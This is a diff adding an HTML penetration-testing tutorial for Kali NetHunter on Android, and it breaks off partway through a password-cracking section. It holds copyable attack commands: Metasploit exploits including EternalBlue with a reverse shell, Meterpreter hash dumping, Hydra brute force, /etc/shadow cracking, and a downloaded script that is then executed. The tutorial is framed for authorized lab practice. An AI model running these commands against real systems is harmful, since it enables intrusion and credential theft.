@@ -1,0 +1,1345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NetHunter White Hat Lab</title>
+<link rel="manifest" href="manifest.json">
+<meta name="theme-color" content="#00ff41">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="NH Lab">
+<link rel="apple-touch-icon" href="icon-192.png">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap');
+
+  :root {
+    --green: #00ff41;
+    --green-dim: #00c832;
+    --green-faint: #003b0f;
+    --amber: #ffb300;
+    --red: #ff3131;
+    --cyan: #00e5ff;
+    --bg: #020b02;
+    --bg2: #060f06;
+    --bg3: #091409;
+    --border: #00ff4133;
+    --text: #b8ffcc;
+    --text-dim: #4caf6a;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,65,0.015) 2px,
+      rgba(0,255,65,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* CRT flicker */
+  @keyframes flicker {
+    0%,100% { opacity: 1; }
+    92% { opacity: 1; }
+    93% { opacity: 0.85; }
+    94% { opacity: 1; }
+    96% { opacity: 0.9; }
+    97% { opacity: 1; }
+  }
+  body { animation: flicker 8s infinite; }
+
+  /* Header */
+  header {
+    background: var(--bg2);
+    border-bottom: 2px solid var(--green);
+    padding: 20px 24px 16px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 0 30px rgba(0,255,65,0.15);
+  }
+
+  .header-top {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 8px;
+  }
+
+  .skull {
+    font-size: 28px;
+    filter: drop-shadow(0 0 8px var(--green));
+  }
+
+  h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(14px, 4vw, 22px);
+    font-weight: 900;
+    color: var(--green);
+    text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,255,65,0.4);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .status-bar {
+    display: flex;
+    gap: 20px;
+    flex-wrap: wrap;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .status-item { display: flex; gap: 6px; align-items: center; }
+  .dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 6px var(--green);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+  .dot.amber { background: var(--amber); box-shadow: 0 0 6px var(--amber); }
+  .dot.cyan { background: var(--cyan); box-shadow: 0 0 6px var(--cyan); }
+
+  /* Nav tabs */
+  .nav {
+    display: flex;
+    gap: 2px;
+    padding: 0 24px;
+    background: var(--bg);
+    border-bottom: 1px solid var(--border);
+    overflow-x: auto;
+    scrollbar-width: none;
+  }
+  .nav::-webkit-scrollbar { display: none; }
+
+  .nav-btn {
+    background: none;
+    border: none;
+    color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 10px 16px;
+    cursor: pointer;
+    white-space: nowrap;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .nav-btn:hover { color: var(--green); }
+  .nav-btn.active {
+    color: var(--green);
+    border-bottom-color: var(--green);
+    text-shadow: 0 0 10px var(--green);
+  }
+
+  /* Main layout */
+  .container { padding: 20px 24px; max-width: 900px; margin: 0 auto; }
+
+  .section { display: none; }
+  .section.active { display: block; }
+
+  /* Module cards */
+  .module {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    margin-bottom: 20px;
+    border-radius: 2px;
+    overflow: hidden;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .module:hover {
+    border-left-color: var(--cyan);
+    box-shadow: 0 0 20px rgba(0,229,255,0.08);
+  }
+
+  .module-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    background: var(--bg3);
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .module-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    color: var(--green);
+    min-width: 28px;
+  }
+
+  .module-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    font-weight: 600;
+    color: var(--green);
+    flex: 1;
+    letter-spacing: 1px;
+  }
+
+  .badge {
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .badge-info { background: rgba(0,229,255,0.15); color: var(--cyan); border: 1px solid rgba(0,229,255,0.3); }
+  .badge-warn { background: rgba(255,179,0,0.15); color: var(--amber); border: 1px solid rgba(255,179,0,0.3); }
+  .badge-danger { background: rgba(255,49,49,0.15); color: var(--red); border: 1px solid rgba(255,49,49,0.3); }
+  .badge-ok { background: rgba(0,255,65,0.12); color: var(--green); border: 1px solid rgba(0,255,65,0.3); }
+
+  .chevron {
+    color: var(--text-dim);
+    font-size: 10px;
+    transition: transform 0.3s;
+  }
+  .module.open .chevron { transform: rotate(90deg); }
+
+  .module-body {
+    display: none;
+    padding: 16px;
+  }
+  .module.open .module-body { display: block; }
+
+  /* Terminal blocks */
+  .term {
+    background: #000;
+    border: 1px solid rgba(0,255,65,0.2);
+    border-radius: 3px;
+    padding: 14px 16px;
+    margin: 12px 0;
+    position: relative;
+    overflow-x: auto;
+  }
+
+  .term-label {
+    position: absolute;
+    top: -1px;
+    left: 12px;
+    font-size: 9px;
+    color: var(--text-dim);
+    background: #000;
+    padding: 0 6px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .term pre {
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    white-space: pre;
+    line-height: 1.7;
+  }
+
+  .term .prompt { color: var(--cyan); }
+  .term .comment { color: #3a6b4a; }
+  .term .flag { color: var(--amber); }
+  .term .output { color: #7daa85; }
+  .term .warn { color: var(--amber); }
+  .term .success { color: var(--green); font-weight: bold; }
+  .term .err { color: var(--red); }
+
+  /* Copy button */
+  .copy-btn {
+    position: absolute;
+    top: 6px;
+    right: 8px;
+    background: rgba(0,255,65,0.1);
+    border: 1px solid rgba(0,255,65,0.3);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: all 0.2s;
+  }
+  .copy-btn:hover { background: rgba(0,255,65,0.25); }
+
+  /* Info boxes */
+  .info-box {
+    border-left: 3px solid var(--cyan);
+    background: rgba(0,229,255,0.05);
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-size: 12px;
+    color: #90e8f5;
+  }
+  .warn-box {
+    border-left: 3px solid var(--amber);
+    background: rgba(255,179,0,0.06);
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-size: 12px;
+    color: #ffd580;
+  }
+  .danger-box {
+    border-left: 3px solid var(--red);
+    background: rgba(255,49,49,0.06);
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-size: 12px;
+    color: #ff8080;
+  }
+
+  p { margin: 8px 0; color: var(--text); font-size: 13px; line-height: 1.7; }
+  h3 { font-family: 'Rajdhani', sans-serif; font-size: 15px; color: var(--cyan); margin: 14px 0 6px; letter-spacing: 1px; text-transform: uppercase; }
+  h4 { color: var(--amber); font-size: 13px; margin: 10px 0 4px; }
+
+  ul, ol { padding-left: 20px; margin: 8px 0; }
+  li { margin: 4px 0; color: var(--text); font-size: 12px; line-height: 1.6; }
+  li::marker { color: var(--green); }
+
+  /* Step list */
+  .steps { counter-reset: step; padding: 0; list-style: none; }
+  .steps li {
+    counter-increment: step;
+    padding: 8px 0 8px 36px;
+    border-bottom: 1px solid rgba(0,255,65,0.06);
+    position: relative;
+  }
+  .steps li::before {
+    content: counter(step, decimal-leading-zero);
+    position: absolute;
+    left: 0;
+    color: var(--green);
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    top: 10px;
+  }
+
+  /* Grid for overview */
+  .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; margin: 14px 0; }
+
+  .card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 14px;
+    border-radius: 2px;
+  }
+  .card-icon { font-size: 22px; margin-bottom: 8px; }
+  .card-title { font-family: 'Orbitron', monospace; font-size: 11px; color: var(--green); margin-bottom: 6px; letter-spacing: 1px; }
+  .card p { font-size: 11px; color: var(--text-dim); }
+
+  /* Progress tracker */
+  .tracker { margin: 16px 0; }
+  .track-item {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 8px 0;
+    border-bottom: 1px solid rgba(0,255,65,0.05);
+    cursor: pointer;
+  }
+  .track-item:hover .track-label { color: var(--green); }
+
+  .checkbox {
+    width: 16px; height: 16px;
+    border: 1px solid var(--text-dim);
+    border-radius: 2px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px;
+    color: var(--green);
+    flex-shrink: 0;
+    transition: all 0.2s;
+  }
+  .checkbox.checked { background: rgba(0,255,65,0.2); border-color: var(--green); box-shadow: 0 0 6px rgba(0,255,65,0.3); }
+
+  .track-label { font-size: 12px; color: var(--text-dim); flex: 1; }
+  .track-label.checked { color: var(--text); text-decoration: line-through; }
+
+  /* Inline code */
+  code {
+    background: rgba(0,255,65,0.1);
+    border: 1px solid rgba(0,255,65,0.2);
+    padding: 1px 6px;
+    border-radius: 2px;
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+  }
+
+  /* Table */
+  table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 12px; }
+  th { background: var(--bg3); color: var(--cyan); padding: 8px 10px; text-align: left; border: 1px solid var(--border); font-family: 'Rajdhani', sans-serif; letter-spacing: 1px; text-transform: uppercase; font-size: 11px; }
+  td { padding: 7px 10px; border: 1px solid rgba(0,255,65,0.1); color: var(--text); vertical-align: top; }
+  tr:nth-child(even) td { background: rgba(0,255,65,0.02); }
+  tr:hover td { background: rgba(0,255,65,0.05); }
+
+  /* Search */
+  .search-wrap { margin-bottom: 18px; position: relative; }
+  .search-input {
+    width: 100%;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    padding: 10px 14px 10px 36px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .search-input:focus { border-color: var(--green); box-shadow: 0 0 10px rgba(0,255,65,0.1); }
+  .search-input::placeholder { color: var(--text-dim); }
+  .search-icon { position: absolute; left: 12px; top: 11px; color: var(--text-dim); font-size: 14px; }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    .container { padding: 12px 14px; }
+    header { padding: 14px 14px 10px; }
+    .nav { padding: 0 8px; }
+    .nav-btn { padding: 8px 10px; font-size: 10px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-top">
+    <span class="skull">☠</span>
+    <div>
+      <h1>NetHunter White Hat Lab</h1>
+    </div>
+  </div>
+  <div class="status-bar">
+    <span class="status-item"><span class="dot"></span> TERMUX ACTIVE</span>
+    <span class="status-item"><span class="dot amber"></span> KALI NETHUNTER</span>
+    <span class="status-item"><span class="dot cyan"></span> ETHICAL MODE</span>
+    <span class="status-item" style="color:#ff8080;">⚠ AUTHORIZED TARGETS ONLY</span>
+  </div>
+</header>
+
+<nav class="nav">
+  <button class="nav-btn active" onclick="showTab('setup')">01 SETUP</button>
+  <button class="nav-btn" onclick="showTab('recon')">02 RECON</button>
+  <button class="nav-btn" onclick="showTab('scan')">03 SCANNING</button>
+  <button class="nav-btn" onclick="showTab('exploit')">04 EXPLOIT</button>
+  <button class="nav-btn" onclick="showTab('wireless')">05 WIRELESS</button>
+  <button class="nav-btn" onclick="showTab('web')">06 WEB APPS</button>
+  <button class="nav-btn" onclick="showTab('post')">07 POST-EXPLOIT</button>
+  <button class="nav-btn" onclick="showTab('report')">08 REPORTING</button>
+  <button class="nav-btn" onclick="showTab('checklist')">✓ CHECKLIST</button>
+</nav>
+
+<div class="container">
+
+<!-- ======= SETUP ======= -->
+<section class="section active" id="setup">
+
+  <div class="danger-box">
+    ⚠ LEGAL NOTICE — Only perform these techniques on systems you own or have explicit written permission to test. Unauthorized access is a criminal offense. This lab is for educational purposes only.
+  </div>
+
+  <div class="grid-2">
+    <div class="card"><div class="card-icon">📱</div><div class="card-title">Platform</div><p>Android + Termux + Kali NetHunter overlay. Root or non-root supported.</p></div>
+    <div class="card"><div class="card-icon">🔧</div><div class="card-title">Requirements</div><p>Android 8+, NetHunter app installed, Termux from F-Droid (not Play Store).</p></div>
+    <div class="card"><div class="card-icon">🌐</div><div class="card-title">Network</div><p>Wi-Fi adapter (external OTG recommended for monitor mode), or use phone Wi-Fi with supported chipset.</p></div>
+    <div class="card"><div class="card-icon">🔒</div><div class="card-title">Ethics</div><p>Always obtain written authorization. Keep a pentest agreement on file.</p></div>
+  </div>
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Install Termux & Configure Base Environment</span>
+      <span class="badge badge-ok">REQUIRED</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="warn-box">Install Termux from <strong>F-Droid</strong>, NOT the Google Play Store — the Play Store version is outdated and breaks pkg.</div>
+
+      <h3>Step 1 — Update Termux</h3>
+      <div class="term">
+        <span class="term-label">termux shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">$ </span>pkg update && pkg upgrade -y
+<span class="prompt">$ </span>pkg install -y git curl wget nano python python-pip nmap \
+                    openssh hydra metasploit netcat-openbsd \
+                    tsu binutils termux-tools</pre>
+      </div>
+
+      <h3>Step 2 — Install NetHunter Rootless (if no root)</h3>
+      <div class="term">
+        <span class="term-label">termux shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">$ </span><span class="comment"># Install NetHunter FS without root</span>
+<span class="prompt">$ </span>wget -O install-nethunter-termux \
+  https://offs.ec/2MceZWr
+<span class="prompt">$ </span>chmod +x install-nethunter-termux
+<span class="prompt">$ </span>./install-nethunter-termux
+<span class="comment"># Choose full or minimal when prompted</span></pre>
+      </div>
+
+      <h3>Step 3 — Enter Kali Shell</h3>
+      <div class="term">
+        <span class="term-label">termux shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">$ </span>nethunter            <span class="comment"># Enter Kali chroot (rootless)</span>
+<span class="prompt">$ </span>nethunter kex passwd  <span class="comment"># Set VNC password</span>
+<span class="prompt">$ </span>nethunter kex &        <span class="comment"># Start KeX desktop (optional)</span></pre>
+      </div>
+
+      <h3>Step 4 — Update Kali inside chroot</h3>
+      <div class="term">
+        <span class="term-label">kali chroot</span>
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>apt update && apt full-upgrade -y
+<span class="prompt">kali# </span>apt install -y kali-linux-headless \
+                      nmap masscan nikto sqlmap \
+                      metasploit-framework john hashcat \
+                      aircrack-ng wireshark-cli burpsuite \
+                      gobuster dirb wfuzz hydra \
+                      netdiscover arp-scan enum4linux \
+                      exploitdb seclists wordlists</pre>
+      </div>
+
+      <div class="info-box">💡 <strong>Storage Access:</strong> Run <code>termux-setup-storage</code> in Termux to access your Android files from <code>~/storage/</code></div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">Set Up a Safe Lab Target (Metasploitable2)</span>
+      <span class="badge badge-info">PRACTICE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <p>For legal practice, run vulnerable VMs on the same network. Options: Metasploitable2, DVWA, VulnHub machines, or TryHackMe/HackTheBox (cloud labs, no hardware needed).</p>
+
+      <h3>Option A — TryHackMe (Easiest, No VM Needed)</h3>
+      <div class="term">
+        <span class="term-label">openvpn setup</span>
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>apt install -y openvpn
+<span class="prompt">kali# </span><span class="comment"># Download your .ovpn from tryhackme.com/access</span>
+<span class="prompt">kali# </span>openvpn ~/your-name.ovpn &
+<span class="prompt">kali# </span>ip a show tun0   <span class="comment"># Confirm VPN is up</span></pre>
+      </div>
+
+      <h3>Option B — Local Network Discovery</h3>
+      <div class="term">
+        <span class="term-label">identify your network</span>
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>ip route        <span class="comment"># Find your subnet, e.g. 192.168.1.0/24</span>
+<span class="prompt">kali# </span>ifconfig        <span class="comment"># Check interface names</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= RECON ======= -->
+<section class="section" id="recon">
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Passive Reconnaissance — OSINT</span>
+      <span class="badge badge-ok">PASSIVE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <p>Passive recon gathers info without touching the target's infrastructure. Zero footprint.</p>
+
+      <h3>WHOIS Lookup</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>whois target.com
+<span class="prompt">kali# </span>whois 192.168.1.100</pre>
+      </div>
+
+      <h3>DNS Enumeration</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>host target.com
+<span class="prompt">kali# </span>dig target.com ANY
+<span class="prompt">kali# </span>dig target.com MX
+<span class="prompt">kali# </span>dig target.com NS
+<span class="prompt">kali# </span><span class="comment"># Try zone transfer (misconfigured DNS may allow it)</span>
+<span class="prompt">kali# </span>dig axfr target.com @ns1.target.com</pre>
+      </div>
+
+      <h3>Subdomain Enumeration</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>apt install -y amass subfinder
+<span class="prompt">kali# </span>amass enum -d target.com
+<span class="prompt">kali# </span>subfinder -d target.com -o subs.txt
+
+<span class="comment"># Using dnsrecon</span>
+<span class="prompt">kali# </span>dnsrecon -d target.com -t brt \
+  -D /usr/share/wordlists/dnsmap.txt</pre>
+      </div>
+
+      <h3>Google Dorks (no direct contact)</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># In browser or theHarvester</span>
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com ext:xml | ext:conf | ext:sql
+
+<span class="prompt">kali# </span>theHarvester -d target.com -b google,bing,linkedin</pre>
+      </div>
+
+      <h3>Shodan Search (passive)</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>pip install shodan
+<span class="prompt">kali# </span>shodan init YOUR_API_KEY
+<span class="prompt">kali# </span>shodan search "apache target.com"
+<span class="prompt">kali# </span>shodan host 192.168.1.100</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">Active Reconnaissance — Network Discovery</span>
+      <span class="badge badge-warn">ACTIVE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="warn-box">⚠ Active recon sends packets to the target — only do this with authorization.</div>
+
+      <h3>Host Discovery</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span><span class="comment"># ARP scan (LAN only)</span>
+<span class="prompt">kali# </span>arp-scan -l
+<span class="prompt">kali# </span>netdiscover -r 192.168.1.0/24
+
+<span class="comment"># Nmap ping sweep</span>
+<span class="prompt">kali# </span>nmap -sn 192.168.1.0/24 -oG alive.txt
+<span class="prompt">kali# </span>grep Up alive.txt | awk '{print $2}'</pre>
+      </div>
+
+      <h3>OS Fingerprinting</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>nmap -O 192.168.1.100
+<span class="prompt">kali# </span>nmap -A 192.168.1.100   <span class="comment"># Aggressive (OS+version+script)</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= SCANNING ======= -->
+<section class="section" id="scan">
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Nmap — Port & Service Scanning</span>
+      <span class="badge badge-warn">ACTIVE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+
+      <h3>Basic Scan Cheatsheet</h3>
+      <table>
+        <tr><th>Command</th><th>What it does</th></tr>
+        <tr><td><code>nmap -sV TARGET</code></td><td>Service version detection</td></tr>
+        <tr><td><code>nmap -sS TARGET</code></td><td>Stealth SYN scan (root required)</td></tr>
+        <tr><td><code>nmap -sU TARGET</code></td><td>UDP port scan</td></tr>
+        <tr><td><code>nmap -p- TARGET</code></td><td>All 65535 ports</td></tr>
+        <tr><td><code>nmap --script vuln TARGET</code></td><td>Run vulnerability scripts</td></tr>
+        <tr><td><code>nmap -sC -sV -p- -oN out.txt</code></td><td>Full scan, save output</td></tr>
+      </table>
+
+      <h3>Full Enumeration Scan</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>TARGET=192.168.1.100
+<span class="prompt">kali# </span>nmap -sC -sV -p- -T4 \
+      --min-rate 1000 \
+      -oN full_scan.txt \
+      $TARGET
+
+<span class="comment"># Vuln scan with NSE scripts</span>
+<span class="prompt">kali# </span>nmap --script=vuln,exploit \
+      -sV -p 80,443,22,21,3306 \
+      $TARGET</pre>
+      </div>
+
+      <h3>Specific Service Scripts</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># SMB enumeration</span>
+<span class="prompt">kali# </span>nmap --script smb-enum-shares,smb-enum-users \
+      -p 445 $TARGET
+
+<span class="comment"># HTTP banner & methods</span>
+<span class="prompt">kali# </span>nmap --script http-methods,http-headers \
+      -p 80,8080,443 $TARGET
+
+<span class="comment"># FTP anonymous login check</span>
+<span class="prompt">kali# </span>nmap --script ftp-anon -p 21 $TARGET</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">Masscan — Fast Wide Network Scan</span>
+      <span class="badge badge-warn">ACTIVE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="warn-box">Masscan is extremely fast — reduce rate if testing on fragile targets.</div>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span><span class="comment"># Fast TCP scan on all ports</span>
+<span class="prompt">kali# </span>masscan -p1-65535 192.168.1.0/24 \
+        --rate=1000 -oG masscan.txt
+
+<span class="comment"># Then verify open ports with nmap</span>
+<span class="prompt">kali# </span>nmap -sV -p $(grep open masscan.txt \
+        | awk -F/ '{print $1}' | tr '\n' ',') $TARGET</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">03</span>
+      <span class="module-title">Vulnerability Scanning — Nikto & OpenVAS</span>
+      <span class="badge badge-warn">ACTIVE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Nikto — web server vuln scanner</span>
+<span class="prompt">kali# </span>nikto -h http://192.168.1.100
+<span class="prompt">kali# </span>nikto -h http://192.168.1.100 -o nikto.html -Format htm
+<span class="prompt">kali# </span>nikto -h https://target.com -ssl -port 443
+
+<span class="comment"># OpenVAS (full vulnerability management)</span>
+<span class="prompt">kali# </span>apt install -y openvas
+<span class="prompt">kali# </span>gvm-setup    <span class="comment"># First-time setup (takes 10-20 min)</span>
+<span class="prompt">kali# </span>gvm-start
+<span class="comment"># Access web UI at https://127.0.0.1:9392</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= EXPLOIT ======= -->
+<section class="section" id="exploit">
+
+  <div class="danger-box">⚠ Exploitation testing MUST only be performed on systems you own or have written authorization to test. These examples use Metasploitable2 (a deliberately vulnerable practice machine).</div>
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Metasploit Framework — Getting Started</span>
+      <span class="badge badge-danger">EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+
+      <h3>Initialize & Launch MSF</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span><span class="comment"># First time — init the database</span>
+<span class="prompt">kali# </span>msfdb init
+<span class="prompt">kali# </span>msfconsole -q
+
+<span class="comment"># Inside msfconsole:</span>
+<span class="prompt">msf6 > </span>db_status
+<span class="prompt">msf6 > </span>workspace -a mylab
+<span class="prompt">msf6 > </span>db_nmap -sC -sV 192.168.1.100</pre>
+      </div>
+
+      <h3>Example: Exploit vsftpd 2.3.4 Backdoor (Metasploitable2)</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">msf6 > </span>search vsftpd
+<span class="prompt">msf6 > </span>use exploit/unix/ftp/vsftpd_234_backdoor
+<span class="prompt">msf6 exploit> </span>set RHOSTS 192.168.1.100
+<span class="prompt">msf6 exploit> </span>set RPORT 21
+<span class="prompt">msf6 exploit> </span>run
+
+<span class="success">[*] Command shell session 1 opened</span>
+<span class="prompt">$ </span>id
+<span class="output">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+      </div>
+
+      <h3>Example: EternalBlue SMB (MS17-010)</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">msf6 > </span>use exploit/windows/smb/ms17_010_eternalblue
+<span class="prompt">msf6 > </span>set RHOSTS 192.168.1.100
+<span class="prompt">msf6 > </span>set LHOST 192.168.1.50   <span class="comment"># Your IP</span>
+<span class="prompt">msf6 > </span>set PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="prompt">msf6 > </span>run</pre>
+      </div>
+
+      <h3>Meterpreter Quick Commands</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">meterpreter > </span>sysinfo       <span class="comment"># System info</span>
+<span class="prompt">meterpreter > </span>getuid        <span class="comment"># Current user</span>
+<span class="prompt">meterpreter > </span>getsystem     <span class="comment"># Try privilege escalation</span>
+<span class="prompt">meterpreter > </span>hashdump      <span class="comment"># Dump password hashes</span>
+<span class="prompt">meterpreter > </span>screenshot    <span class="comment"># Capture screen</span>
+<span class="prompt">meterpreter > </span>shell         <span class="comment"># Drop to system shell</span>
+<span class="prompt">meterpreter > </span>background    <span class="comment"># Background session</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">Password Attacks — Hydra & John the Ripper</span>
+      <span class="badge badge-danger">EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+
+      <h3>Hydra — Online Brute Force</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># SSH brute force</span>
+<span class="prompt">kali# </span>hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+        ssh://192.168.1.100 -t 4 -V
+
+<span class="comment"># HTTP form login</span>
+<span class="prompt">kali# </span>hydra -l admin -P rockyou.txt \
+        192.168.1.100 http-post-form \
+        "/login:user=^USER^&pass=^PASS^:Invalid"
+
+<span class="comment"># FTP brute force</span>
+<span class="prompt">kali# </span>hydra -L users.txt -P passes.txt ftp://192.168.1.100</pre>
+      </div>
+
+      <h3>John the Ripper — Offline Hash Cracking</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Crack Linux /etc/shadow</span>
+<span class="prompt">kali# </span>unshadow /etc/passwd /etc/shadow > hashes.txt
+<span class="prompt">kali# </span>john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+<span class="comment"># Crack NTLM Windows hashes</span>
+<span class="prompt">kali# </span>john --format=NT hashes.txt --wordlist=rockyou.txt
+<span class="prompt">kali# </span>john --show hashes.txt   <span class="comment"># Show cracked</span></pre>
+      </div>
+
+      <h3>Hashcat — GPU-accelerated Cracking</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># MD5 (-m 0), SHA1 (-m 100), NTLM (-m 1000)</span>
+<span class="prompt">kali# </span>hashcat -m 0 -a 0 hashes.txt rockyou.txt
